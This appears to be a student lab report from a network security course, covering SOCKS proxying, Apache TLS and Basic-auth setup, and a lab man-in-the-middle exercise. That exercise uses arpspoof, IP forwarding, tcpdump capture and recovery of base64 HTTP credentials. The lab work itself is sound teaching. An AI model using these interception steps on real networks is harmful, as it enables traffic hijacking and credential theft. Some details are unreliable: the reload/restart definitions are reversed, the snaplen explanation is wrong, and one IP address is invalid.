# PCS Project 2- Part 2: Hands-on experience with TLS based web communication and preserving
confidentiality using HTTPS based communication.

## A. Team Information:

    * Bhargavi Poyekar: CH33454
    * Smit Patne: WD31175
Attacker: 133.228.86.1
Socks Proxy: 133.338.86.2 (130.85.121.58)
Web Server: 133.228.86.3

## B. Setup Socks Proxy:

    1. ssh -D 0.0.0.0:22222 Bhargavi@130.85.121.58

        => -D: setup tunnel from local port 22222

    2. Setting up proxy setting in Firefox:

        – Preferences->Network->Settings 
        – Manual Proxy: setup SOCKS5
        – 127.0.0.1 22222
    
    3. Login into server using ssh
        
        => ssh -o ProxyCommand='nc -x 127.0.0.1:22222 %h %p' crsuser@133.228.86.3

    4. In Local Machine's (Windows) /Windows/System32/drivers/etc/hosts.conf add :

        => 133.228.86.3 CH33454.csee.umbc.local

 
## C. Commands invoked on attacker VM (133.228.86.1) for ARP spoofing/poisoning.

    1. sudo arpspoof -i eth1 -t 133.228.86.2 -r 133.228.86.3

        => Arpspoof utility is used to redirect traffic from 133.228.86.2 
        and 133.228.86.3 to attacker machine 
        => -i just tells the interface.
        => -t specifies the target.
        => r specifies host. 

    2. sudo sysctl -w net.ipv4.ip_forward=1

        => Enables IP forwarding. 
        => Allows attacker machine to forward traffic between 
        target machines.
    
    3. sudo tcpdump -i eth1 -s0 -A -n -w http.pcap 'host 133.228.86.2 and host 133.228.86.3 and tcp port 80 
    and (((ip[2:2] -((ip[0]&0xf)<<2))-((tcp[12]&0xf0)>>2))!=0)'

        => -i: Mentions the interface.
        => -s0: Snaplen 0: Truncates the packages. 
        => -n: IP Addresses are not converted to names. 
        => -A : Ascii Readble text
        => -w: where to capture and store.
        => host : IP addresses of the target machines.
        => tcp port 80: http request and response.
        => remaining condition for not capturing http packets.

    4. sudo tcpdump -i eth1 -s0 -A -n -w http.pcap 'host 133.228.86.2 and host 133.228.86.3 and tcp port 443 
    and (((ip[2:2] -((ip[0]&0xf)<<2))-((tcp[12]&0xf0)>>2))!=0)'

        => Similar to above, only change is tcp port 443 for https.

    5. sudo tcpdump -A -r http.pcap | grep "Authorization" -n -B10

        => Read the captured tcpdump packets in ASCII format.
        => grep shows the line containing Authorization
        => B10: shows all the 10 lines before the matching line. This helps in finding the packet number.


## D. Self-signed SSL certificate for Web Server (133.228.86.3) and Apache Configuration:

    1. sudo a2enmod ssl

        => Enables the ssl mode. 

    2. sudo systemctl restart apache2

        => Restarts the Apache with changed settings.

    3. sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/umbc.key 
    -out /etc/ssl/certs/umbc.crt

        * Country Name (2 letter code) [XX]:US
        * State or Province Name (full name) []:Maryland
        * Locality Name (eg, city) [Default City]:Baltimore 
        * Organization Name (eg, company) [Default Company Ltd]:UMBC
        * Organizational Unit Name (eg, section) []:
        * Common Name (eg, your name or your server's hostname) []:CH33454.csee.umbc.local
        * Email Address []:bpoyeka1@umbc.edu

        => Creates the self-signed certificate, using 2048 size key using RSA encryption.


    4. sudo nano /etc/apache2/sites-available/default-ssl.conf

        => To install and configure the SSl certificate, found these lines and made the edits of respective certificate and key created in last step: 
        
            SSLCertificateFile /etc/ssl/certs/umbc.crt
            SSLCertificateKeyFile /etc/ssl/private/umbc.key

    5. sudo a2ensite default-ssl.conf

        => Enables the default-ssl confuguration file.

    6. sudo systemctl reload apache2

        => Reload apache for the changes to take place.

## E. Commands used for creating user/password for web authentication:

    1. In /var/www/html/ we created hello.html and added the required content.

    2. cd /var/www/html

    3. mkdir private && cd private

        => Create and Go to the Private folder. This folder is used for the html page with restricted 
        access.

    4. sudo nano team.html 

    5. sudo htpasswd -c /var/www/passwords/password.file Bhargavi

        => Creates password.file and adds the user Bhargavi
        => -c for creating the password file.

    6. sudo htpasswd /var/www/passwords/password.file Smit

        => Here -c is not used as the password.file is already created in last step.
        => We just need to add another user.

    7. sudo nano /var/www/html/private/.htaccess

        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/passwords/password.file
        Require user Bhargavi Smit

        => This file tells who has access to the private folder and where to refer for the users.
    
    8. sudo nano /etc/apache2/apache2.conf

        <Directory /var/www/>
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>

        => All the requirements are granted.
    
    9. sudo systemctl restart apache2

        => Apache is restarted.


## F. Base64 encoded text and its decoded value:

    Packet Numbers (Double Capture) in http.pcap:

        1. 22:06:06.945027 on line 77.
        2. 22:06:06.945131 on line 90.

    Base64 encoded text: U21pdDpTbWl0
    Decoded text: Smit:Smit

    The first before ':' is username and after it is the password.

    ### Base64 encoding: 

        => 3 Character bytes are divided into 4 6-bit parts
        => Every 6 bit converted to their decimal equivalent
        => Then convert the numbers (in the range 0-63) to their equivalent Base64 characters.

    ### Base64 Decoding:

        => First 4 characters:

            Encoded Text        U           2           1           p
            Decimal             20          54          53          41
            6bit parts          010100      110110      110101      101001
            Binary              01010011    01101101    01101001
            Hex Value           0x53        0x6D        0x69
            Base64              S           m           i

        => Next 4 characters: 

            Encoded Text        d           D           p           T
            Decimal             29          3           41          19
            6bit parts          011101      000011      101001      010011
            Binary              01110100    00111010    01010011
            Hex Value           0x74        ox3A        0x53
            Base64              t           :           S

        => Next 4 characters:

            Encoded Text        b           W           l           0
            Decimal             27           22          37          52
            6bit parts          011011      010110      100101      110100
            Binary              01101101    01101001    01110100
            Hex Value           0x6D        ox69        0x74
            Base64              m           i           t




## G. Challenges Faced:

    1. First we got a bit confused in how to create the Socks Proxy as we 
    had Windows Operating System and used Putty to login into the VM's. But then 
    we tried to do the ssh commands in Windows cmd and it worked, so we were able 
    to use the same commands given in the Firewall slides.

    2. After creating the self signed certificate and succesfully creating the html pages,
    when we tried to access the pages using the domain name mentioned in the Project document
    (csee.umbc.local), it was unable to connect to the server. But we ere able to access the 
    web pages using direct IP address. We tried to debug it by discussing it with Professor,
    and then we found out that the system is able to resolve the dns, but firefox was having 
    trouble resolving the domains mentioned in the hosts file. So, we continued the 
    project using IP address.

    3. We were facing some trouble in doing the tcp capture for the MITM using Socks Proxy,
    because few concepts were not cleared, but when Professor explained, we understood what 
    we were doing wrong.

## H. Summary:

    1. We understood how Socks Proxy works, and how to set it up.
    2. We now know why https is more secured than http. The TLS is used to 
    encrypt the requests and digitally sign them in https.
    3. We got to know about the steps of creating self-signed certificate and 
    it is still mentioned in the browser that it is not secured as it is self signed.
    4. We understood how to make an html file private and provide authentication to it 
    using .htaccess and create users using htpasswd.
    5. We were able to decode the base64 encoded text and understood the encoding and 
    decoding algorithm of base64. 
    6. We also understood the difference between Apache reload and restart
        Reload: stop+start
        Restart: remains running but rereads the configuration files. 

## I. References:

    1. https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters/
    2. https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-22-04
    3. https://stackoverflow.com/questions/31567165/what-is-the-difference-between-apache2-reload-restart-graceful
    4. https://help.dreamhost.com/hc/en-us/articles/216363187-Password-protecting-your-site-with-an-htaccess-file
    5. https://www.tcpdump.org/manpages/tcpdump.1.html
    6. http://www.sunshine2k.de/articles/coding/base64/understanding_base64.html#:~:text=Base64%20is%20an%20algorithm%20to,but%20only%20text%2Dbased%20data.
    7. https://www.asciitable.com/
    8. Professor's Forewall(16) slides for Socks Proxy.



